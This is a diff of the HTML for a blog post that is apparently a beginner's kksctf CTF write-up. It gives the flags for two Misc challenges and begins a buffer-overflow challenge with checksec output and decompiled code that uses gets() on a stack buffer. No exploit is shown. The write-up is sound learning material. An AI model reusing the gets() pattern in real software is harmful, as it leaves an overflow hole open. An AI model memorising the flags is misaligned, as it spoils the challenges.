@@ -1,69 +1,33 @@
 <!DOCTYPE html>
-
-
-
-
-
 <html lang="en">
 <head>
   <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
 <meta name="theme-color" content="#222">
-<meta name="generator" content="Hexo 3.9.0">
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.4.1">
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.4.1">
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.4.1">
-  <link rel="mask-icon" href="/images/logo.svg?v=7.4.1" color="#222">
+<meta name="generator" content="Hexo 5.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
   <link rel="manifest" href="/images/manifest.json">
 
-<link rel="stylesheet" href="/css/main.css?v=7.4.1">
+<link rel="stylesheet" href="/css/main.css">
 
 <link rel="stylesheet" href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic|Times New Roman:300,300italic,400,400italic,700,700italic|Roboto Mono:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
-<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
-
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
 
 <script id="hexo-configurations">
-  var NexT = window.NexT || {};
-  var CONFIG = {
-    root: '/',
-    scheme: 'Gemini',
-    version: '7.4.1',
-    exturl: false,
-    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
-    copycode: {"enable":true,"show_result":true,"style":"mac"},
-    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
-    bookmark: {"enable":false,"color":"#222","save":"auto"},
-    fancybox: false,
-    mediumzoom: false,
-    lazyload: false,
-    pangu: false,
-    algolia: {
-      appID: '',
-      apiKey: '',
-      indexName: '',
-      hits: {"per_page":10},
-      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
-    },
-    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
-    path: 'search.xml',
-    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
-    translation: {
-      copy_button: 'Copy',
-      copy_success: 'Copied',
-      copy_failure: 'Copy failed'
-    },
-    sidebarPadding: 40
-  };
-</script>
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"spwpun.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"valine","storage":true,"lazyload":false,"nav":null,"activeClass":"valine"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
 
-  <meta name="description" content="This was my really first ctf competition in ctftimes, with my team name called Spwpun, and got the rank 71/392, that makes me feel happy. I’ve solved 8 challs, though they seemed like simple.">
-<meta name="keywords" content="kksctf">
+  <meta name="description" content="This was my really first ctf competition in ctftimes, with my team name called Spwpun, and got the rank 71&#x2F;392, that makes me feel happy. I’ve solved 8 challs, though they seemed like simple. Miscru!e">
 <meta property="og:type" content="article">
 <meta property="og:title" content="kksctf writeup">
 <meta property="og:url" content="https://spwpun.github.io/2019/12/30/kksctf-writeup/index.html">
 <meta property="og:site_name" content="Spwpun&#39;s Blog">
-<meta property="og:description" content="This was my really first ctf competition in ctftimes, with my team name called Spwpun, and got the rank 71/392, that makes me feel happy. I’ve solved 8 challs, though they seemed like simple.">
-<meta property="og:locale" content="en">
+<meta property="og:description" content="This was my really first ctf competition in ctftimes, with my team name called Spwpun, and got the rank 71&#x2F;392, that makes me feel happy. I’ve solved 8 challs, though they seemed like simple. Miscru!e">
+<meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://spwpun.github.io/2019/12/30/kksctf-writeup/image-20191230101913885.png">
 <meta property="og:image" content="https://spwpun.github.io/2019/12/30/kksctf-writeup/image-20191230102845917.png">
 <meta property="og:image" content="https://spwpun.github.io/2019/12/30/kksctf-writeup/image-20191230103632387.png">
@@ -71,29 +35,28 @@
 <meta property="og:image" content="https://spwpun.github.io/2019/12/30/kksctf-writeup/TIM%E6%88%AA%E5%9B%BE20191228175539.png">
 <meta property="og:image" content="https://spwpun.github.io/2019/12/30/kksctf-writeup/IMG_20200103_211413.jpg">
 <meta property="og:image" content="https://spwpun.github.io/2019/12/30/kksctf-writeup/flag1.png">
-<meta property="og:updated_time" content="2020-01-03T13:49:36.570Z">
+<meta property="article:published_time" content="2019-12-30T02:00:15.000Z">
+<meta property="article:modified_time" content="2020-01-03T13:49:36.570Z">
+<meta property="article:author" content="Demen Lee">
+<meta property="article:tag" content="kksctf">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="kksctf writeup">
-<meta name="twitter:description" content="This was my really first ctf competition in ctftimes, with my team name called Spwpun, and got the rank 71/392, that makes me feel happy. I’ve solved 8 challs, though they seemed like simple.">
 <meta name="twitter:image" content="https://spwpun.github.io/2019/12/30/kksctf-writeup/image-20191230101913885.png">
-  <link rel="canonical" href="https://spwpun.github.io/2019/12/30/kksctf-writeup/">
+
+<link rel="canonical" href="https://spwpun.github.io/2019/12/30/kksctf-writeup/">
 
 
 <script id="page-configurations">
   // https://hexo.io/docs/variables.html
   CONFIG.page = {
     sidebar: "",
-    isHome: false,
-    isPost: true,
-    isPage: false,
-    isArchive: false
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
   };
 </script>
 
   <title>kksctf writeup | Spwpun's Blog</title>
   
-
-
 
 
 
@@ -112,7 +75,6 @@
   .use-motion .post-body,
   .use-motion .collection-header { opacity: initial; }
 
-  .use-motion .logo,
   .use-motion .site-title,
   .use-motion .site-subtitle {
     opacity: initial;
@@ -130,19 +92,8 @@
   <div class="container use-motion">
     <div class="headband"></div>
 
-    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
       <div class="header-inner"><div class="site-brand-container">
-  <div class="site-meta">
-
-    <div>
-      <a href="/" class="brand" rel="start">
-        <span class="logo-line-before"><i></i></span>
-        <span class="site-title">Spwpun's Blog</span>
-        <span class="logo-line-after"><i></i></span>
-      </a>
-    </div>
-  </div>
-
   <div class="site-nav-toggle">
     <div class="toggle" aria-label="Toggle navigation bar">
       <span class="toggle-line toggle-line-first"></span>
@@ -150,97 +101,86 @@
       <span class="toggle-line toggle-line-last"></span>
     </div>
   </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Spwpun's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
 </div>
 
 
+
+
 <nav class="site-nav">
-  
-  <ul id="menu" class="menu">
-      
-      
-      
-        
+  <ul id="menu" class="main-menu menu">
         <li class="menu-item menu-item-home">
-      
-    
 
-    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>Home</a>
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
 
   </li>
-      
-      
-      
-        
         <li class="menu-item menu-item-about">
-      
-    
 
-    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>About</a>
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
 
   </li>
-      
-      
-      
-        
         <li class="menu-item menu-item-tags">
-      
-    
 
-    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>Tags</a>
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
 
   </li>
-      
-      
-      
-        
         <li class="menu-item menu-item-categories">
-      
-    
 
-    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>Categories</a>
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
 
   </li>
-      
-      
-      
-        
         <li class="menu-item menu-item-archives">
-      
-    
 
-    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>Archives</a>
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
 
   </li>
       <li class="menu-item menu-item-search">
-        <a href="javascript:;" class="popup-trigger">
-        
-          <i class="fa fa-search fa-fw"></i>Search</a>
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
       </li>
-    
   </ul>
-
 </nav>
-  <div class="site-search">
+
+
+
+  <div class="search-pop-overlay">
     <div class="popup search-popup">
-    <div class="search-header">
+        <div class="search-header">
   <span class="search-icon">
     <i class="fa fa-search"></i>
   </span>
   <div class="search-input-container">
-    <input autocomplete="off" autocorrect="off" autocapitalize="none"
+    <input autocomplete="off" autocapitalize="off"
            placeholder="Searching..." spellcheck="false"
-           type="text" id="search-input">
+           type="search" class="search-input">
   </div>
   <span class="popup-btn-close">
     <i class="fa fa-times-circle"></i>
   </span>
 </div>
-<div id="search-result"></div>
-
-</div>
-<div class="search-pop-overlay"></div>
-
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
   </div>
+</div>
+
+    </div>
+  </div>
+
 </div>
     </header>
 
@@ -253,75 +193,59 @@
   <a href="https://github.com/spwpun" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
 
 
-    <main id="main" class="main">
+    <main class="main">
       <div class="main-inner">
         <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
             
 
-          <div id="content" class="content">
-            
-
-  <div class="posts-expand">
-      
+    
   
   
-  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="en">
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="https://spwpun.github.io/2019/12/30/kksctf-writeup/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
       <meta itemprop="name" content="Demen Lee">
       <meta itemprop="description" content="Sharing, Communicating more, then moving on......">
-      <meta itemprop="image" content="/images/avatar.gif">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
       <meta itemprop="name" content="Spwpun's Blog">
     </span>
       <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">kksctf writeup
-
-          
+        <h1 class="post-title" itemprop="name headline">
+          kksctf writeup
         </h1>
 
         <div class="post-meta">
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
+                <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">Posted on</span>
 
-              
-                
-              
-
               <time title="Created: 2019-12-30 10:00:15" itemprop="dateCreated datePublished" datetime="2019-12-30T10:00:15+08:00">2019-12-30</time>
             </span>
-          
-            
-
-            
               <span class="post-meta-item">
                 <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
+                  <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
                 <time title="Modified: 2020-01-03 21:49:36" itemprop="dateModified" datetime="2020-01-03T21:49:36+08:00">2020-01-03</time>
               </span>
-            
-          
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
+                <i class="far fa-folder"></i>
               </span>
               <span class="post-meta-item-text">In</span>
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Writeups/" itemprop="url" rel="index"><span itemprop="name">Writeups</span></a></span>
-
-                
-                
-              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Writeups/" itemprop="url" rel="index"><span itemprop="name">Writeups</span></a>
+                </span>
             </span>
-          
 
           
             <span id="/2019/12/30/kksctf-writeup/" class="post-meta-item leancloud_visitors" data-flag-title="kksctf writeup" title="Views">
@@ -331,18 +255,24 @@
               <span class="post-meta-item-text">Views: </span>
               <span class="leancloud-visitors-count"></span>
             </span>
-          
+            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
   
   <span class="post-meta-item">
     
       <span class="post-meta-item-icon">
-        <i class="fa fa-comment-o"></i>
+        <i class="far fa-comment"></i>
       </span>
-        
-      
       <span class="post-meta-item-text">Valine: </span>
     
-    <a title="valine" href="/2019/12/30/kksctf-writeup/#comments" itemprop="discussionUrl"><span class="post-comments-count valine-comment-count" data-xid="/2019/12/30/kksctf-writeup/" itemprop="commentCount"></span></a>
+    <a title="valine" href="/2019/12/30/kksctf-writeup/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2019/12/30/kksctf-writeup/" itemprop="commentCount"></span>
+    </a>
   </span>
   
   
@@ -356,25 +286,25 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <p>This was my really first ctf competition in ctftimes, with my team name called Spwpun, and got the rank 71/392, that makes me feel happy. I’ve solved 8 challs, though they seemed like simple.</p><a id="more"></a>
+        <p>This was my really first ctf competition in ctftimes, with my team name called Spwpun, and got the rank 71/392, that makes me feel happy. I’ve solved 8 challs, though they seemed like simple.</p>
 <h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3><h4 id="ru-e5p-g3"><a href="#ru-e5p-g3" class="headerlink" title="ru!e5p@g3"></a>ru!e5p@g3</h4><ul>
 <li>Description: Haven’t you read our rules?</li>
 </ul>
 <p>As the Decription said, we could find the flag in rules:</p>
-<p><img src="//spwpun.github.io/2019/12/30/kksctf-writeup/image-20191230101913885.png" alt="image-20191230101913885"></p>
+<p><img src="/2019/12/30/kksctf-writeup/image-20191230101913885.png" alt="image-20191230101913885"></p>
 <ul>
-<li>flag: kks{w3lcom3_to_0ur_ru!e5p@g3}</li>
+<li> flag: kks{w3lcom3_to_0ur_ru!e5p@g3}</li>
 </ul>
 <h4 id="Xmas-Tree"><a href="#Xmas-Tree" class="headerlink" title="Xmas Tree"></a>Xmas Tree</h4><ul>
 <li>Description: Do you like to decorate the Christmas tree?</li>
 </ul>
 <p>From the Description, and we could see a Xmas Tree in the right-down of the backgroud image. From the source code of this Xmas Tree, we could see there were several strange <code>span</code> elements, just like this:</p>
-<p><img src="//spwpun.github.io/2019/12/30/kksctf-writeup/image-20191230102845917.png" alt="image-20191230102845917"> </p>
+<p><img src="/2019/12/30/kksctf-writeup/image-20191230102845917.png" alt="image-20191230102845917"> </p>
 <p>So flag may be these elements, use Python to get the all instaces:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">permutation</span><span class="params">(s,i)</span>:</span></span><br><span class="line">    coms = []</span><br><span class="line">    <span class="keyword">if</span> i == len(s):</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"kks&#123;"</span>+<span class="string">''</span>.join(s)+<span class="string">"$$&#125;"</span> <span class="comment">#kks&#123;n3w_y34r_m@dn3$$&#125; new_year_madness</span></span><br><span class="line">        coms.append(s)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(i,len(s)):</span><br><span class="line">            s[j],s[i] = s[i],s[j]</span><br><span class="line">            permutation(s,i+<span class="number">1</span>)</span><br><span class="line">            s[j],s[i] = s[i],s[j]</span><br><span class="line">    <span class="keyword">return</span> coms</span><br><span class="line"></span><br><span class="line">s1 = <span class="string">"w_y"</span></span><br><span class="line">s2 = <span class="string">"m@d"</span></span><br><span class="line">s3 = <span class="string">"n3"</span></span><br><span class="line">s4 = <span class="string">"n3"</span></span><br><span class="line">s5 = <span class="string">"34r_"</span></span><br><span class="line">strings = [s1, s2, s3, s4, s5]</span><br><span class="line">combines = permutation(strings, <span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">permutation</span>(<span class="params">s,i</span>):</span></span><br><span class="line">    coms = []</span><br><span class="line">    <span class="keyword">if</span> i == <span class="built_in">len</span>(s):</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;kks&#123;&quot;</span>+<span class="string">&#x27;&#x27;</span>.join(s)+<span class="string">&quot;$$&#125;&quot;</span> <span class="comment">#kks&#123;n3w_y34r_m@dn3$$&#125; new_year_madness</span></span><br><span class="line">        coms.append(s)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i,<span class="built_in">len</span>(s)):</span><br><span class="line">            s[j],s[i] = s[i],s[j]</span><br><span class="line">            permutation(s,i+<span class="number">1</span>)</span><br><span class="line">            s[j],s[i] = s[i],s[j]</span><br><span class="line">    <span class="keyword">return</span> coms</span><br><span class="line"></span><br><span class="line">s1 = <span class="string">&quot;w_y&quot;</span></span><br><span class="line">s2 = <span class="string">&quot;m@d&quot;</span></span><br><span class="line">s3 = <span class="string">&quot;n3&quot;</span></span><br><span class="line">s4 = <span class="string">&quot;n3&quot;</span></span><br><span class="line">s5 = <span class="string">&quot;34r_&quot;</span></span><br><span class="line">strings = [s1, s2, s3, s4, s5]</span><br><span class="line">combines = permutation(strings, <span class="number">0</span>)</span><br></pre></td></tr></table></figure>
 
 <p>And see the readable text:</p>
-<p><img src="//spwpun.github.io/2019/12/30/kksctf-writeup/image-20191230103632387.png" alt="image-20191230103632387"></p>
+<p><img src="/2019/12/30/kksctf-writeup/image-20191230103632387.png" alt="image-20191230103632387"></p>
 <ul>
 <li>flag: kks{n3w_y34r_m@dn3$$}</li>
 </ul>
@@ -387,76 +317,76 @@
 </ul>
 <h3 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h3><h4 id="Baby-buffer-overflow"><a href="#Baby-buffer-overflow" class="headerlink" title="Baby buffer overflow"></a>Baby buffer overflow</h4><p>As the title said, this is a simple buffer overflow chall. It is friendly to beginners just like me, we were given a file named “baby_bof”. </p>
 <p>First check the file:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">(pwn) pwn@ubuntu:~/Documents/kksctf$ file baby_bof </span><br><span class="line">baby_bof: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, <span class="keyword">for</span> GNU/Linux 3.2.0, BuildID[sha1]=679ffb807feb7aef6982de068fe64bb6deb7fb0c, not stripped</span><br><span class="line">(pwn) pwn@ubuntu:~/Documents/kksctf$ checksec baby_bof </span><br><span class="line">[*] <span class="string">'/home/pwn/Documents/kksctf/baby_bof'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">(pwn) pwn@ubuntu:~/Documents/kksctf$ ./baby_bof </span><br><span class="line">We have prepared a buffer overflow <span class="keyword">for</span> you</span><br><span class="line">Can you get use of it?</span><br><span class="line">Enter your name: hahaha?</span><br><span class="line">Hello, hahaha?!</span><br><span class="line">(pwn) pwn@ubuntu:~/Documents/kksctf$</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">(pwn) pwn@ubuntu:~/Documents/kksctf$ file baby_bof </span><br><span class="line">baby_bof: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, <span class="keyword">for</span> GNU/Linux 3.2.0, BuildID[sha1]=679ffb807feb7aef6982de068fe64bb6deb7fb0c, not stripped</span><br><span class="line">(pwn) pwn@ubuntu:~/Documents/kksctf$ checksec baby_bof </span><br><span class="line">[*] <span class="string">&#x27;/home/pwn/Documents/kksctf/baby_bof&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">(pwn) pwn@ubuntu:~/Documents/kksctf$ ./baby_bof </span><br><span class="line">We have prepared a buffer overflow <span class="keyword">for</span> you</span><br><span class="line">Can you get use of it?</span><br><span class="line">Enter your name: hahaha?</span><br><span class="line">Hello, hahaha?!</span><br><span class="line">(pwn) pwn@ubuntu:~/Documents/kksctf$ </span><br></pre></td></tr></table></figure>
 
 <p>So open it with IDA32 and press “F5”, we could see the main function’s Pseudocode:</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+0h] [ebp-100h]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"We have prepared a buffer overflow for you"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Can you get use of it?"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Enter your name: "</span>);</span><br><span class="line">  read_wrapper(&amp;s);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Hello, %s!\n"</span>, &amp;s);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+0h] [ebp-100h]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;We have prepared a buffer overflow for you&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Can you get use of it?&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter your name: &quot;</span>);</span><br><span class="line">  read_wrapper(&amp;s);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello, %s!\n&quot;</span>, &amp;s);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>The program will ask your name to input, in function read_wrapper, it will use <code>gets</code> function to set the <code>s</code>‘s value to our input:</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> __<span class="function">cdecl <span class="title">read_wrapper</span><span class="params">(<span class="keyword">char</span> *s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v1; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [esp+0h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = <span class="built_in">strlen</span>(s);</span><br><span class="line">    result = i;</span><br><span class="line">    <span class="keyword">if</span> ( v1 &lt;= i )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( s[i] &gt; <span class="string">'@'</span> &amp;&amp; s[i] &lt;= <span class="string">'Z'</span> )</span><br><span class="line">      s[i] += <span class="number">0x20</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
